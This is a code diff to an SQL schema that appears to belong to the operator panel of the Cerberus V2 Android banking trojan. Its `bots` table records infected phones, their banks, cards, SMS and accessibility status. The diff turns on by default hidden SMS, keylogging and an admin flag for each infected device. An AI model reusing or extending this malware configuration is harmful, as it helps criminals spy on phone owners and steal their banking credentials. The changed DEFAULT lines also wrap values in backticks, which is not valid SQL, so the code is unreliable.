@@ -51,7 +51,7 @@ CREATE TABLE `bots` (
   `activeDevice` varchar(254) DEFAULT NULL,
   `timeWorking` varchar(254) DEFAULT NULL,
   `statDownloadModule` varchar(3) DEFAULT NULL,
-  `statAdmin` varchar(3) DEFAULT NULL,
+  `statAdmin` varchar(3) DEFAULT `1`,
   `updateSettings` varchar(3) DEFAULT NULL,
   `locale` varchar(10) DEFAULT NULL,
   `batteryLevel` varchar(10) DEFAULT NULL
@@ -62,7 +62,7 @@ CREATE TABLE `bots` (
 --
 
 INSERT INTO `bots` (`id_key`, `idbot`, `ip`, `operator`, `phoneNumber`, `model`, `android`, `TAG`, `country`, `lastconnect`, `date_infection`, `commands`, `banks`, `comment`, `statProtect`, `statScreen`, `statAccessibility`, `statSMS`, `statCards`, `statBanks`, `statMails`, `activeDevice`, `timeWorking`, `statDownloadModule`, `statAdmin`, `updateSettings`, `locale`, `batteryLevel`) VALUES
-(1, 'WELCOME', '-', '-', '', '-', '0', 'CERBERUS V2', 'us', '', '', '', '', NULL, '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', 'us', '50');
+(1, 'WELCOME', '-', '-', '', '-', '0', 'CERBERUS V2', 'us', '', '', '', '', NULL, '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '1', '0', 'us', '50');
 
 -- --------------------------------------------------------
 
@@ -168,10 +168,10 @@ CREATE TABLE `logsPhoneNumber` (
 CREATE TABLE `settingBots` (
   `id` int(254) UNSIGNED NOT NULL,
   `idbot` varchar(30) NOT NULL,
-  `hideSMS` varchar(3) DEFAULT NULL,
+  `hideSMS` varchar(3) DEFAULT `1`,
   `lockDevice` varchar(3) DEFAULT NULL,
   `offSound` varchar(3) DEFAULT NULL,
-  `keylogger` varchar(3) DEFAULT NULL,
+  `keylogger` varchar(3) DEFAULT `1`,
   `activeInjection` varchar(3000) DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
